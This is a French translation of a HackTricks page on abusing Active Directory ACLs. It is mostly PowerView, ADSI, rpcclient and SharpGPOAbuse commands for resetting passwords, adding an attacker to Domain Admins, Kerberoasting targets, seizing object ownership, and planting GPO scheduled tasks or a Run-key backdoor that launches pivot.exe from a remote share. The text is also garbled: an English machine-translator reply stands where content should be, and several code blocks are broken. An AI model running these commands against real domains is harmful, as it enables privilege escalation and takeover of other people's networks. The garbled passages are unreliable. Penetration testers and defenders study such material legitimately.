# Abus des ACLs/ACEs d'Active Directory

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes pour les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des scans de menaces proactifs, trouve des problèmes dans toute votre pile technologique, des API aux applications web et systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Contexte

Ce laboratoire consiste à abuser des permissions faibles des Listes de Contrôle d'Accès Discrétionnaires (DACLs) d'Active Directory et des Entrées de Contrôle d'Accès (ACEs) qui composent les DACLs.

Les objets Active Directory tels que les utilisateurs et les groupes sont des objets sécurisables et les DACLs/ACEs définissent qui peut lire/modifier ces objets (par exemple, changer le nom du compte, réinitialiser le mot de passe, etc.).

Un exemple d'ACEs pour l'objet sécurisable "Domain Admins" peut être vu ici :

![](../../../.gitbook/assets/1.png)

Certains des permissions et types d'objets Active Directory qui nous intéressent en tant qu'attaquants :

* **GenericAll** - droits complets sur l'objet (ajouter des utilisateurs à un groupe ou réinitialiser le mot de passe d'un utilisateur)
* **GenericWrite** - mise à jour des attributs de l'objet (par exemple, script de connexion)
* **WriteOwner** - changer le propriétaire de l'objet pour un utilisateur contrôlé par l'attaquant pour prendre le contrôle de l'objet
* **WriteDACL** - modifier les ACEs de l'objet et donner à l'attaquant le plein contrôle de l'objet
* **AllExtendedRights** - capacité d'ajouter un utilisateur à un groupe ou de réinitialiser un mot de passe
* **ForceChangePassword** - capacité de changer le mot de passe d'un utilisateur
* **Self (Auto-adhésion)** - capacité de vous ajouter à un groupe

Dans ce laboratoire, nous allons explorer et essayer d'exploiter la plupart des ACEs mentionnées ci-dessus.

Il est utile de se familiariser avec tous les [liens BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) et autant de [Droits Étendus Active Directory](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) que possible car vous ne savez jamais quand vous pourriez rencontrer un droit moins commun lors d'une évaluation.

## GenericAll sur Utilisateur

En utilisant powerview, vérifions si notre utilisateur attaquant `spotless` a des `droits GenericAll` sur l'objet AD pour l'utilisateur `delegate` :
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Nous pouvons voir que notre utilisateur `spotless` a effectivement les droits `GenericAll`, permettant ainsi à l'attaquant de prendre le contrôle du compte :

![](../../../.gitbook/assets/2.png)

*   **Changer le mot de passe** : Vous pourriez simplement changer le mot de passe de cet utilisateur avec

```bash
net user <username> <password> /domain
```
*   **Kerberoasting ciblé** : Vous pourriez rendre l'utilisateur **kerberoastable** en définissant un **SPN** sur le compte, le kerberoaster et tenter de le craquer hors ligne :

```powershell
# Définir SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# Obtenir le Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap
# Nettoyer SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# Vous pouvez également utiliser l'outil https://github.com/ShutdownRepo/targetedKerberoast
# pour obtenir les hashes d'un ou de tous les utilisateurs
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ASREPRoasting ciblé** : Vous pourriez rendre l'utilisateur **ASREPRoastable** en **désactivant** la **préauthentification** puis en réalisant un ASREPRoast.

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## GenericAll sur un Groupe

Voyons si le groupe `Domain admins` a des permissions faibles. Tout d'abord, obtenons son `distinguishedName` :
```csharp
Get-NetGroup "domain admins" -FullData
```
Since there is no English text provided other than the image reference, there is nothing to translate. If you have specific English text that you would like translated into French, please provide it, and I will be happy to assist.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Nous pouvons constater que notre utilisateur attaquant `spotless` a de nouveau des droits `GenericAll` :

![](../../../.gitbook/assets/5.png)

Cela nous permet effectivement de nous ajouter (l'utilisateur `spotless`) au groupe `Domain Admin` :
```csharp
net group "domain admins" spotless /add /domain
```
```markdown
![](../../../.gitbook/assets/6.gif)

La même chose pourrait être réalisée avec Active Directory ou le module PowerSploit :
```
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write sur Ordinateur/Utilisateur

* Si vous avez ces privilèges sur un **objet Ordinateur**, vous pouvez réaliser une prise de contrôle de l'objet Ordinateur avec [Kerberos **Délégation Contrainte basée sur les Ressources**](../resource-based-constrained-delegation.md).
* Si vous avez ces privilèges sur un utilisateur, vous pouvez utiliser l'une des [premières méthodes expliquées sur cette page](./#genericall-on-user).
* Ou, que vous l'ayez sur un Ordinateur ou un utilisateur, vous pouvez utiliser les **Shadow Credentials** pour l'usurper :

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty sur Groupe

Si notre utilisateur contrôlé a le droit `WriteProperty` sur `All` les objets pour le groupe `Domain Admin` :

![](../../../.gitbook/assets/7.png)

Nous pouvons à nouveau nous ajouter au groupe `Domain Admins` et escalader les privilèges :
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## Self (Auto-adhésion) sur un groupe

Un autre privilège qui permet à l'attaquant de s'ajouter à un groupe :

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Auto-adhésion)

Un autre privilège qui permet à l'attaquant de s'ajouter à un groupe :
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

Si nous avons `ExtendedRight` sur le type d'objet `User-Force-Change-Password`, nous pouvons réinitialiser le mot de passe de l'utilisateur sans connaître leur mot de passe actuel :
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/13.png)

Faire de même avec powerview :
```
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

Une autre méthode qui ne nécessite pas de manipulation de conversion de chaîne sécurisée par mot de passe :
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
```markdown
![](../../../.gitbook/assets/15.png)

...ou une ligne unique si aucune session interactive n'est disponible :
```
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

et une dernière méthode pour réaliser cela depuis Linux :
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Plus d'infos :

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/fr-fr/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6](https://docs.microsoft.com/fr-fr/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6)
* [https://docs.microsoft.com/fr-fr/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/fr-fr/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner sur un groupe

Notez comment avant l'attaque, le propriétaire de `Domain Admins` est `Domain Admins` :

![](../../../.gitbook/assets/17.png)

Après l'énumération des ACE, si nous trouvons qu'un utilisateur sous notre contrôle a des droits `WriteOwner` sur `ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...nous pouvons changer le propriétaire de l'objet `Domain Admins` pour notre utilisateur, qui dans notre cas est `spotless`. Notez que le SID spécifié avec `-Identity` est le SID du groupe `Domain Admins` :
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## GenericWrite sur l'utilisateur
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/20.png)

`WriteProperty` sur un `ObjectType`, qui dans ce cas particulier est `Script-Path`, permet à l'attaquant de réécrire le chemin du script de connexion de l'utilisateur `delegate`, ce qui signifie que la prochaine fois que l'utilisateur `delegate` se connectera, son système exécutera notre script malveillant :
```
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
Ci-dessous, on voit que le champ de script de connexion de l'utilisateur a été mis à jour dans l'AD :

![](../../../.gitbook/assets/21.png)

## GenericWrite sur un groupe

Cela vous permet d'ajouter comme membres du groupe de nouveaux utilisateurs (vous-même, par exemple) :
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
```markdown
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus critiques afin de les corriger plus rapidement. Intruder surveille votre surface d'attaque, effectue des scans de menaces proactifs, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

Si vous êtes le propriétaire d'un groupe, comme je suis le propriétaire du groupe AD `Test` :

![](../../../.gitbook/assets/22.png)

Ce que vous pouvez bien sûr faire via powershell :
```
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

Et vous avez un `WriteDACL` sur cet objet AD :

![](../../../.gitbook/assets/24.png)

...vous pouvez vous octroyer des privilèges [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) avec une pincée de sorcellerie ADSI :
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
Ce qui signifie que vous contrôlez désormais entièrement l'objet AD :

![](../../../.gitbook/assets/25.png)

Cela signifie effectivement que vous pouvez maintenant ajouter de nouveaux utilisateurs au groupe.

Il est intéressant de noter que je n'ai pas pu abuser de ces privilèges en utilisant le module Active Directory et les cmdlets `Set-Acl` / `Get-Acl` :
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Réplication sur le domaine (DCSync)**

La permission **DCSync** implique d'avoir ces permissions sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.\
[**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)

## Délégation de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

Parfois, certains utilisateurs/groupes peuvent se voir déléguer l'accès pour gérer les Objets de Stratégie de Groupe comme c'est le cas pour l'utilisateur `offense\spotless` :

![](../../../.gitbook/assets/a13.png)

Nous pouvons le voir en utilisant PowerView de cette manière :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
### Énumération des permissions GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Nous savons que l'ObjectDN mentionné dans la capture d'écran ci-dessus fait référence au GPO `New Group Policy Object` puisque l'ObjectDN pointe vers `CN=Policies` et aussi le `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` qui est identique dans les paramètres du GPO comme mis en évidence ci-dessous :

![](../../../.gitbook/assets/a15.png)

Si nous voulons rechercher spécifiquement des GPO mal configurés, nous pouvons enchaîner plusieurs cmdlets de PowerSploit de la manière suivante :
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Ordinateurs avec une politique donnée appliquée**

Nous pouvons maintenant résoudre les noms des ordinateurs auxquels la stratégie de groupe `Misconfigured Policy` est appliquée :
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**Politiques appliquées à un ordinateur donné**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
```markdown
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**Unités d'organisation avec une politique donnée appliquée**
```
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuser de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Une des méthodes pour abuser de cette mauvaise configuration et obtenir l'exécution de code est de créer une tâche planifiée immédiate à travers le GPO comme ceci :
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

Ce qui précède ajoutera notre utilisateur spotless au groupe local `administrators` de la machine compromise. Remarquez comment avant l'exécution du code, le groupe ne contient pas l'utilisateur `spotless` :

![](../../../.gitbook/assets/a20.png)

### Module GroupPolicy **- Abus de GPO**

{% hint style="info" %}
Vous pouvez vérifier si le module GroupPolicy est installé avec `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. En cas de besoin, vous pouvez l'installer avec `Install-WindowsFeature –Name GPMC` en tant qu'admin local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Ce payload, après la mise à jour du GPO, nécessitera également que quelqu'un se connecte à l'ordinateur.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abus de GPO**

{% hint style="info" %}
Il ne peut pas créer de GPOs, donc nous devons toujours le faire avec RSAT ou modifier un GPO auquel nous avons déjà un accès en écriture.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour de la politique <a href="#force-policy-update" id="force-policy-update"></a>

Les mises à jour abusives précédentes des **GPO sont rechargées** environ toutes les 90 minutes.\
Si vous avez accès à l'ordinateur, vous pouvez le forcer avec `gpupdate /force`.

### Sous le capot <a href="#under-the-hood" id="under-the-hood"></a>

Si nous observons les Tâches Planifiées du GPO `Misconfigured Policy`, nous pouvons voir notre `evilTask` là :

![](../../../.gitbook/assets/a22.png)

Ci-dessous se trouve le fichier XML créé par `New-GPOImmediateTask` qui représente notre tâche planifiée malveillante dans le GPO :

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
```markdown
### Utilisateurs et Groupes <a href="#users-and-groups" id="users-and-groups"></a>

La même élévation de privilèges pourrait être obtenue en abusant de la fonctionnalité Utilisateurs et Groupes des GPO. Notez dans le fichier ci-dessous, ligne 6, où l'utilisateur `spotless` est ajouté au groupe local `administrators` - nous pourrions changer l'utilisateur pour un autre, en ajouter un autre ou même ajouter l'utilisateur à un autre groupe/multiples groupes puisque nous pouvons modifier le fichier de configuration de la politique dans l'emplacement indiqué en raison de la délégation GPO attribuée à notre utilisateur `spotless` :

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
```markdown
{% endcode %}

De plus, nous pourrions envisager d'exploiter des scripts de connexion/déconnexion, d'utiliser le registre pour des autoruns, d'installer des .msi, de modifier des services et d'autres voies d'exécution de code similaires.

## Références

* Initialement, ces informations ont été principalement copiées de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des scans de menaces proactifs, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm_source=referral&utm_campaign=hacktricks) aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
